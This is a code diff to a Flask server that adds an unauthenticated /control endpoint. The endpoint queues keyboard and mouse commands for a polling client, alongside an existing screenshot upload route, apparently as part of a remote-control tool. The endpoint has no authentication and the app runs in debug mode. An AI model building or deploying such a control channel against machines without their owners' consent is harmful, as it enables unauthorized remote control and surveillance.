@@ -12,6 +12,7 @@ startTime = time()
 spam = False
 selected_user = "93"
 image = ""
+control_data = {}
 STATIC_FOLDER = os.path.join("static")
 if not os.path.exists(STATIC_FOLDER):
     os.makedirs(STATIC_FOLDER)
@@ -401,6 +402,24 @@ def screenshot():
 		image = file["image"]
 	return "done"
 	
-	
+@app.route("/control",methods=["GET","POST"])
+def control():
+	global control_data
+	if request.method == "POST":
+		data = request.get_json()
+		if data["type"] == "key":
+			control_data["type"] = "key"
+			control_data["btn"] = data["button"]
+		elif data["type"] == "click":
+			control_data["type"] = "mouse"
+			control_data["x"] = data["x"]
+			control_data["y"] = data["y"]
+			control_data["mouse"] = data["button"]
+			control_data["width"] = data["width"]
+			control_data["height"] = data["height"]
+	if request.method == "GET":
+		data1 = control_data
+		control_data = {}
+		return jsonify(data1)
 if __name__ == "__main__":
     app.run(debug=True)
